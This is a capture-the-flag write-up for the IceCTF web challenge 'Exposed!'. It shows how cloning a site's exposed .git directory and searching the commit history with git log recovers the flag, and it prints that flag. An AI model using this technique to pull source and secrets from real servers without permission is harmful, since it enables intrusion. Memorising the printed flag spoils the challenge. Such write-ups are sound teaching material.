---
layout: writeup
title: 'Exposed!'
level: 2
difficulty:
points: 60
categories: [web]
tags: []
flag: IceCTF{secure_y0ur_g1t_repos_pe0ple}
---
## Challenge

John is pretty happy with himself, he just made his first [website][1]!
He used all the hip and cool systems, like NginX, PHP and Git! Everyone
is so happy for him, but can you get him to give you the flag?

## Solution

Git is a pretty big hint here, it seemed safe to assume that if he was
deploying with git, then the web directory was git.

    $ git clone http://exposed.vuln.icec.tf/
    Cloning into 'exposed.vuln.icec.tf'...
    fatal: repository 'http://exposed.vuln.icec.tf/' not found

    $ git clone http://exposed.vuln.icec.tf/.git
    Cloning into 'exposed.vuln.icec.tf'...
    Checking connectivity... done.

    # Success!

    $ git log -p | grep IceCTF
    -IceCTF{this_isnt_the_flag_either}
    -                    echo 'IceCTF{not_this_flag}';
    +IceCTF{this_isnt_the_flag_either}
    +                    echo 'IceCTF{not_this_flag}';
    -                echo 'Hello World! IceCTF{secure_y0ur_g1t_repos_pe0ple}';
    +                echo 'Hello World! IceCTF{secure_y0ur_g1t_repos_pe0ple}';
{: .language-console}


[1]: http://exposed.vuln.icec.tf/
